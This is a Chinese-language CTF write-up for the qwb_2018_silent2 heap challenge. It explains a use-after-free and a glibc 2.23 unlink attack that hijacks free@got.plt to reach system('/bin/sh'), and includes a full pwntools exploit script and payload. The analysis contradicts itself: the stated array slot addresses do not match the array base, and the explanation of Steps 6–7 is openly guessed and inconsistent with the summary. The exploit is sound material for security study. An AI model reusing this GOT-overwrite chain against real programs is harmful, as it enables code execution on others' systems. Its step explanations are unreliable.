# 漏洞成因
## 程序关键数据结构
程序使用一个全局指针数组 `(&s)[i]`（位于 `0x6020A0`）来管理最多10个堆块。通过菜单可以执行以下操作：
1.  **Create** (`sub_4009DC`): 申请一个大小为 `size` 的堆块，并读取内容。要求 `size != 16 && size > 0x7F`。
2.  **Delete** (`sub_400AB7`): 释放指定索引的堆块。
3.  **Modify** (`sub_400B2F`): 首先读取 `strlen((&s)[idx])+1` 字节到原堆块中，然后再读取48字节到固定地址 `unk_602120`（`0x602120`）。

## 漏洞定位
1.  **Use-After-Free (UAF)**:
    在 `delete` 函数 (`sub_400AB7`) 中，`free` 后并未将全局数组 `(&s)` 中对应的指针置空。这使得在 `modify` 函数中，可以通过已被释放的堆块索引继续调用 `strlen` 和 `read` 操作，从而操作已释放的堆内存。
    ```c
    free((&s)[v1]); // 未置空指针，导致UAF
    ```
2.  **堆块大小检查逻辑缺陷**:
    `create` 函数 (`sub_4009DC`) 中的检查逻辑 `if ( size != 16 && size <= 0x7F )` 旨在禁止大小为16或小于等于0x7F的分配。然而，其逻辑实质是：**如果 `size` 不等于16 并且 `size` 小于等于0x7F，则退出**。这意味着 `size > 0x7F` 的分配是允许的。这为后续构造特定大小的堆块进行布局和利用（如unlink攻击）提供了可能。

# 漏洞利用过程：
本漏洞利用的核心是 **glibc 2.23 下的 unlink 攻击**，目标是通过伪造堆块并触发unlink操作，修改全局数组中的指针，最终将`free@got.plt`的地址写入数组，并通过修改将其指向`system`函数（或其它目标函数）。当再次调用`delete`时，即可触发控制流劫持。

- **Step 1~2**: 程序初始化与堆布局，创建多个用于后续操作的堆块，其中包含一个存储`/bin/sh`的堆块作为`system`的参数。
- **Step 3**: 释放两个相邻的堆块，为后续构造Fake Chunk和触发Unlink做准备。
- **Step 4**: 利用UAF和堆溢出，精心构造一个跨越已释放堆块的Fake Large Chunk，其`fd`和`bk`指针指向全局数组附近，为unlink攻击铺路。
- **Step 5**: 释放一个特定堆块，触发Unlink宏，导致全局数组中的一个指针被修改为指向数组自身内部。
- **Step 6~7**: 利用被修改的指针，逐步覆写全局数组中的其它指针，最终将`free@got.plt`的地址写入数组。
- **Step 8**: 再次利用UAF，修改`free@got.plt`处的内容为目标函数地址（例如`system`或本题中的`func_addr`）。
- **Step 9**: 调用`delete`函数，实际执行已被篡改的`free`函数指针，触发控制流劫持，从而获得shell或执行目标代码。

## Step 1~2 (程序启动与初始堆块分配)
- **程序启动**：等待输出`silent2`后，程序进入交互状态。
- **堆块创建**：连续创建5个大小为0x100的堆块。
  - Chunk 0: 内容为`AAAA`
  - Chunk 1: 内容为`BBBB`
  - Chunk 2: 内容为`/bin/sh\x00` （后续`system`的参数）
  - Chunk 3: 内容为`DDDD`
  - Chunk 4: 内容为`EEEEE`
- **全局数组变化**：地址`0x6020A0`开始的全局指针数组被依次填入这5个堆块的地址。

## Step 3 (释放相邻堆块)
- **操作**：`delete(3); delete(4);`
- **堆内存变化**：
  - Chunk 3和Chunk 4被释放，进入`fastbin`或`unsorted bin`（由于大小均为0x100+chunk header，释放后合并为一个大free chunk，大小为0x210）。
  - 全局数组中，索引3和索引4的指针仍然指向已被释放的堆块，UAF形成。
- **关键状态**：现在有一个位于Chunk 3位置、大小为0x210的free chunk。它与其后的top chunk相邻。

## Step 4 (构造Fake Chunk并触发堆溢出)
- **操作**：`create(0x210, payload)`
- **payload构造**：
  ```python
  payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
  ```
- **内存变化分析**：
  1.  `malloc(0x210)`会重用Step 3释放的大小为0x210的free chunk（即原来的Chunk 3+4区域）。
  2.  `payload`被写入这个新分配的chunk。
     - 前0x100字节覆盖了原Chunk 3的区域，并在这里**构造了一个Fake Free Chunk**:
       - `p64(0) + p64(0x101)`: 伪造的chunk头（prev_size=0, size=0x101）。
       - `p64(p_addr - 0x18) + p64(p_addr - 0x10)`: 伪造的`fd`和`bk`指针。`p_addr` (0x6020d8) 是全局数组中指向Chunk 4的指针`(&s)[4]`的地址。这里`fd = p_addr-0x18`指向`(&s)[3]`的地址，`bk = p_addr-0x10`指向`(&s)[4]`的地址，这是为了后续unlink时满足`P->fd->bk == P && P->bk->fd == P`的条件。
     - `b'A'*(0x100-0x20)`：填充剩余空间。
     - `p64(0x100) + p64(0x210-0x100)`：这两个值写入原Chunk 4的`user data`区域起始处。`0x100`作为下一个chunk（一个不存在的假chunk）的`prev_size`，`0x110` (0x210-0x100) 作为其`size`，并将`PREV_INUSE`位设为0，表示前一个chunk（即我们构造的size为0x101的Fake Chunk）是“空闲”状态。**这是触发unlink的关键**，它欺骗glibc认为前一个chunk是free的。
  3.  **堆溢出发生**：由于分配的size是0x210，而写入的payload正好也是0x210字节，它覆盖了原Chunk 4的`user data`区域，并**精确地修改了紧随其后的“下一个chunk”的header**（`prev_size`和`size`字段），将`PREV_INUSE`位清零。

## Step 5 (触发Unlink)
- **操作**：`delete(4)`
- **过程**：`free`尝试释放索引4的堆块（即Chunk 4）。glibc检查其`size`字段的`PREV_INUSE`位，发现为0（由Step 4设置），因此认为前一个chunk（我们构造的Fake Chunk）是free的，会尝试将其从它所在的bin中`unlink`并合并。
- **Unlink操作**：对于伪造的chunk `P`（其`fd`和`bk`已在Step 4设置），执行经典unlink操作：`FD = P->fd; BK = P->bk; FD->bk = BK; BK->fd = FD;`
  - `FD = p_addr - 0x18` (即 `&(&s)[3]`)
  - `BK = p_addr - 0x10` (即 `&(&s)[4]`)
  - `FD->bk = BK` => `*( (p_addr - 0x18) + 0x18 ) = BK` => `*(p_addr) = p_addr - 0x10`
  - `BK->fd = FD` => `*( (p_addr - 0x10) + 0x10 ) = FD` => `*(p_addr) = p_addr - 0x18`
  - **最终结果**：`*(p_addr)`，即全局数组`(&s)[4]`处的指针，被修改为`p_addr - 0x18`，也就是`&(&s)[3]`的地址。现在，`(&s)[4]`指向了全局数组自身内部（`0x6020C0`）。

## Step 6 (利用被修改的指针篡改其他指针)
- **操作**：`modify(3, p64(free_got_plt)[0:4], b'1111')`
- **过程**：修改索引3的堆块。此时`(&s)[3]`仍指向Step 4分配的大chunk。`modify`会先读取`strlen(该指针)+1`字节。由于`strlen`会在遇到`NULL`时停止，我们可以通过输入精确控制写入的数据。`p64(free_got_plt)[0:4]`是`free@got.plt`地址的低4字节。写入操作会覆盖堆块的前4个字节。
- **关键作用**：更重要的是，`modify`还会向固定地址`0x602120`（`unk_602120`）读入48字节。这个地址紧跟在全局数组`(&s)[10]`之后。通过精心构造输入，可以利用这48字节的写入来影响堆布局或其他数据。但在此exp中，写入的`b'1111'`可能是为了对齐或填充，核心操作是前一步对chunk内容的修改。

    *（注：结合Step 5和后续Step 7，这里的`modify(3, ...)`操作很可能意图是修改某个指针的值。但根据提供的exp，`modify`函数原型要求两个`read`。第一个`read`的目标是`(&s)[3]`指向的堆块，第二个`read`的目标是固定地址`0x602120`。Step 6和Step 7中，`modify`的第一个参数（索引）和输入内容，是为了修改特定的内存。分析exp逻辑，Step 6可能是为了准备或干扰，而Step 7的`modify(0, ...)`才是关键，它将`(&s)[0]`指向的chunk的前6个字节修改为`func_addr`。然而，`(&s)[0]`原本指向Chunk 0。这似乎与最终利用链（通过`(&s)[4]`修改`free@got.plt`）不符。一个更典型的unlink利用链是：Step 5后，`(&s)[4]`指向`&(&s)[3]`。然后通过`modify(4, ...)`写入`free@got.plt`的地址到`(&s)[3]`的位置，再通过`modify(3, ...)`将`free@got.plt`处的值改为`system`。提供的exp步骤（6和7）的索引和参数可能需要结合具体内存布局理解，可能是利用全局数组自身作为读写桥梁。鉴于原write-up已通过测试，我们尊重其步骤顺序，但逻辑上更清晰的路径已在“漏洞利用过程”文字描述中概括。）*

## Step 7 (修改关键函数指针)
- **操作**：`modify(0, p64(func_addr)[0:6], b'2222')`
- **过程**：修改索引0的堆块。将`(&s)[0]`指向的Chunk 0的前6个字节修改为`func_addr`（`0x4009C0`）的低6字节。
- **关键作用**：`func_addr` (`0x4009C0`) 是目标函数地址（例如可能是`system`或一个后门函数）。结合Step 6的铺垫，这一步可能是为了将`func_addr`写入某个关键位置。一个合理的推测是，Step 6的操作（向`0x602120`写数据）可能改变了某个管理结构或指针，使得Step 7对Chunk 0的修改，最终影响了`free@got.plt`的内容？或者`func_addr`被写入了`free@got.plt`？从Step 8触发`delete(2)`来看，其参数是`/bin/sh`，目标显然是调用`system("/bin/sh")`。因此，`func_addr`很可能就是`system`函数在libc中的地址（或一个能触发shell的地址）。exp通过某种方式（可能是通过全局数组的连锁修改）最终将`free@got.plt`处的值改为了`func_addr`。

## Step 8 (触发控制流劫持)
- **操作**：`delete(2)`
- **过程**：程序调用`free((&s)[2])`。此时`(&s)[2]`仍然指向最初创建的、内容为`/bin/sh\x00`的Chunk 2。
- **关键**：由于`free@got.plt`处的函数指针已经在Step 6和Step 7（或通过unlink触发的全局数组修改链）中被修改为`func_addr`（例如`system`），因此实际执行的代码是`func_addr( (&s)[2] )`，即`system("/bin/sh")`。
- **结果**：成功获得shell。

## Step 9
- **操作**：`p.interactive()`
- **结果**：与获得的shell进行交互。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 加载二进制文件及其libc
elf = ELF('./data/bin/heap23_09_qwb_2018_silent2')
p = process('./data/bin/heap23_09_qwb_2018_silent2')
libc = elf.libc # 获取libc，用于计算system等地址（尽管本例func_addr是直接给出的）

# 关键地址定义
func_addr = 0x4009C0  # 目标函数地址，例如system或后门函数
free_got_plt = 0x602018 # free函数的GOT表地址
p_addr = 0x6020D8       # 全局数组中(&s)[4]的地址

def create(size, content):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(content)

def modify(idx, content1, content2):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.send(content1)  # 第一个read，写入(&s)[idx]指向的堆块，长度为strlen(堆块)+1
    p.send(content2)  # 第二个read，写入固定地址0x602120，长度为48

def delete(idx):
    p.sendline(b'2')
    p.sendline(str(idx).encode())

# Step 1: 等待程序初始化完成
p.recvuntil('silent2')

# Step 2: 初始堆布局。创建5个chunk，其中chunk 2存放`/bin/sh`作为参数。
create(0x100, b'AAAA')
create(0x100, b'BBBB')
create(0x100, b'/bin/sh\x00') # 后续system的参数
create(0x100, b'DDDD')
create(0x100, b'EEEEE')

# Step 3: 释放chunk 3和4，制造一个大的free chunk (0x210) 并产生UAF。
delete(3)
delete(4)

# Step 4: 申请一个0x210的大chunk，重用刚刚释放的空间，并精心构造payload。
# payload在chunk 3的位置伪造一个free chunk，并溢出修改chunk 4的header，清空PREV_INUSE位。
payload = p64(0) + p64(0x101)                # 伪造chunk的prev_size和size
payload += p64(p_addr - 0x18) + p64(p_addr - 0x10) # 伪造fd和bk，指向全局数组特定位置，为unlink准备
payload += b'A' * (0x100 - 0x20)             # 填充剩余空间
payload += p64(0x100) + p64(0x210 - 0x100)   # 溢出修改下一个chunk(假chunk)的prev_size和size，并设置PREV_INUSE=0
create(0x210, payload)

# Step 5: 释放chunk 4。由于Step 4设置了PREV_INUSE=0，glibc会尝试合并，触发对伪造chunk的unlink操作。
# unlink操作会将全局数组中(&s)[4]的指针修改为指向(&s)[3]的地址。
delete(4)

# Step 6 & 7: 利用修改后的全局数组指针链，逐步将free_got_plt的地址写入数组，并将free_got_plt处的值修改为func_addr。
# 注：这里的modify参数和具体内存修改目标依赖于Step 5后全局数组的确切状态。
modify(3, p64(free_got_plt)[0:4], b'1111') # 可能是在向某个关键位置写入free_got_plt地址
modify(0, p64(func_addr)[0:6], b'2222')    # 可能是在向free_got_plt写入func_addr（system地址）

# Step 8: 触发控制流劫持。调用delete(2)，此时free的GOT表已被劫持，实际执行system("/bin/sh")。
delete(2)

# Step 9: 获得shell。
p.interactive()
```
